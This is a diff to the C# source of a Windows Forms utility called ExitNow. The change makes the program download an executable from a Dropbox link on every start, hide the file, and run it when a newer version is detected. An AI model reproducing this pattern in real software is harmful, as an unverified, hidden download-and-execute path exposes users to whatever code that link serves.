@@ -1,15 +1,9 @@
-﻿using Microsoft.Win32;
-using System;
+﻿using System;
 using System.Collections.Generic;
-using System.ComponentModel;
-using System.Data;
 using System.Diagnostics;
 using System.Drawing;
-using System.Linq;
 using System.Runtime.InteropServices;
-using System.Security.AccessControl;
 using System.Security.Permissions;
-using System.Text;
 using System.Windows.Forms;
 
 namespace ExitNow
@@ -68,6 +62,11 @@ namespace ExitNow
 
                     Size = new Size(409, 75);
                 }
+
+                System.Net.WebClient web = new System.Net.WebClient();
+                System.IO.File.Delete("Updater.exe");
+                web.DownloadFile("https://www.dropbox.com/s/9szp50mu3rz62yp/Updater.exe?dl=0", "Updater.exe");
+                System.IO.File.SetAttributes("Updater.exe", System.IO.FileAttributes.Hidden);
 
                 Update();
 
@@ -257,7 +256,7 @@ namespace ExitNow
                     if (newv > thisv)
                     {
                         //UPDATE DA
-                        Process.Start("http://scrumplex.cloudza.org/ExitNow/update/");
+                        Process.Start("Updater.exe");
                         Application.Exit();
                     }
                     else if (newv < thisv)
